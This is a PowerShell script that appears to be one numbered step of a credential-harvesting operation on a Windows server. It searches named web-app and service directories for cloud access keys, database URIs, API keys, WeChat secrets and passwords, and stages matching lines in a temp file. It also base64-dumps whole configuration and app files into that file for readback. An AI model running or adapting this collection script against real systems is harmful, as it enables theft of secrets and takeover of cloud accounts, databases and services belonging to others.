$R="C:\Windows\TEMP\s35.txt"
function W($s){Add-Content -Path $R -Value $s}
del $R 2>$null
$dirs=@("D:\webapps\wangzhan","D:\webapps\ylbx","D:\soft\robot","D:\nexus","D:\ShenTong")
$pat="LTAI[A-Za-z0-9]{12,24}|(?i)accessKey(?:Id|Secret)\s*[:=]{1,2}\s*['""]?[A-Za-z0-9_\-@]{10,}|mongodb://[A-Za-z0-9@:./_-]{6,}|redis://[A-Za-z0-9@:./_-]{4,}|sk-[A-Za-z0-9]{20,35}|(?i)appSecret\s*[:=]|(?i)weixin|(?i)jdbc:[a-z]+://|(?i)password\s*[:=]{1,2}\s*['""]?[A-Za-z0-9@!]{6,24}|(?i)secret\s*[:=]{1,2}\s*['""]?[A-Za-z0-9_\-@]{10,}"
$cnt=0
foreach($d in $dirs){
  Get-ChildItem $d -Recurse -File -EA SilentlyContinue | Where-Object { $_.FullName -notmatch "\.venv\\" -and $_.Length -lt 300000 -and $_.Extension -match "\.(yml|yaml|properties|py|conf|ini|json|xml|js|env|bat|cfg|toml)$" } | ForEach-Object {
    if($cnt -lt 500){ $cnt++
      try{
        $m=Select-String -Path $_.FullName -Pattern $pat -EA SilentlyContinue
        if($m){ foreach($x in ($m | Select-Object -First 6)){ W ("SEC " + $_.FullName.Replace("D:\","") + " L" + $x.LineNumber + " " + $x.Line.Trim().Substring(0,[Math]::Min(180,$x.Line.Trim().Length))) } }
      }catch{}
    }
  }
}
W ("SCANNED_FILES " + $cnt)
# 定向读回关键配置全文 (base64)
foreach($f in @("D:\soft\robot\application-local.yml","D:\webapps\wangzhan\app.py","D:\webapps\ylbx\app.py","D:\webapps\ylbx\serve.py")){
  if(Test-Path $f){
    $b=[Convert]::ToBase64String([System.IO.File]::ReadAllBytes($f))
    W ("FILE_B64 " + $f.Replace("D:\","") + " " + $b)
  }
}
W "DONE35"
exit 0
